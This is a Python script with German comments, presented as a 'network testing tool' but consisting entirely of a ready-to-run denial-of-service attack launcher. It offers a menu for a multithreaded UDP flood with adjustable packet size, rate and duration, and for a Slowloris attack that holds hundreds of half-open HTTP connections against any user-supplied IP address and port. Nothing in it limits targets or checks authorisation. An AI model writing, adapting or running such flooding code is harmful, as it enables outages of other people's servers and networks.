import os
import random
import socket
import threading
import time
import sys

# Globale Variablen
packet_counter = [0]  # Mutable List für Zugriff in Threads
stop_event = threading.Event()

# Banner
def show_banner(color):
    os.system("clear")
    print(f"{color}")
    print("""
██████╗ ██████╗  
██╔══██╗██╔══██╗
██████╔╝██████╔
██╔═══╝ ██╔═══╝ 
██║     ██║     
╚═╝     ╚═╝      
    """)
    print("\033[0m")

# UDP Flood
def udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration):
    stop_event.clear()
    packet_counter[0] = 0

    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_bytes = random._urandom(packet_size)
        start_time = time.time()

        while not stop_event.is_set():
            try:
                sock.sendto(udp_bytes, (ip, port))
                packet_counter[0] += 1
                elapsed = time.time() - start_time
                if packet_counter[0] / elapsed > packet_rate:
                    time.sleep(0.001)
            except Exception as e:
                print(f"[ERROR] UDP Flood Fehler: {e}")
                break

    threads_list = [threading.Thread(target=udp_flood) for _ in range(threads)]
    for t in threads_list:
        t.start()

    time.sleep(duration)
    stop_event.set()
    for t in threads_list:
        t.join()
    print(f"[INFO] UDP Flood beendet. Gesendete Pakete: {packet_counter[0]}")

# Slowloris (TCP Keep-Alive)
def slowloris_attack(ip, port, threads, duration):
    stop_event.clear()
    packet_counter[0] = 0

    def slowloris():
        sockets = []
        try:
            for _ in range(200):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, port))
                sock.send(b"GET / HTTP/1.1\r\n")
                sockets.append(sock)
        except Exception as e:
            print(f"[ERROR] Verbindung fehlgeschlagen: {e}")

        while not stop_event.is_set():
            for sock in sockets:
                try:
                    sock.send(b"X-a: Keep-alive\r\n")
                    packet_counter[0] += 1
                except:
                    sockets.remove(sock)

    threads_list = [threading.Thread(target=slowloris) for _ in range(threads)]
    for t in threads_list:
        t.start()

    time.sleep(duration)
    stop_event.set()
    for t in threads_list:
        t.join()
    print(f"[INFO] Slowloris beendet. Gesendete Pakete: {packet_counter[0]}")

# Farbauswahl
def choose_color():
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Wähle eine Farbe: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

# Hauptprogramm
if __name__ == "__main__":
    os.system("clear")
    color = choose_color()
    print(f"{color}\nNetzwerk-Testing-Tool v2.0\033[0m\n")

    while True:
        print("1 - UDP Flood")
        print("2 - Slowloris Attack")
        print("3 - Beenden")
        choice = input(" [ Wähle eine Option ] : ")

        if choice == "3":
            print("[INFO] Programm beendet.")
            sys.exit()

        elif choice == "1":  # UDP Flood
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            duration = int(input("Dauer des Angriffs (Sekunden): "))
            threads = int(input("Anzahl der Threads: "))
            packet_size = max(1, min(65507, int(input("Paketgröße (Bytes, 1-65507): "))))
            packet_rate = max(1, int(input("Maximale Pakete pro Sekunde (min. 1): ")))

            udp_flood_attack(ip, port, packet_size, packet_rate, threads, duration)

        elif choice == "2":  # Slowloris
            ip = input("Ziel-IP-Adresse: ")
            port = int(input("Ziel-Port: "))
            duration = int(input("Dauer des Angriffs (Sekunden): "))
            threads = int(input("Anzahl der Threads: "))

            slowloris_attack(ip, port, threads, duration)

            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
            stop_event.set()
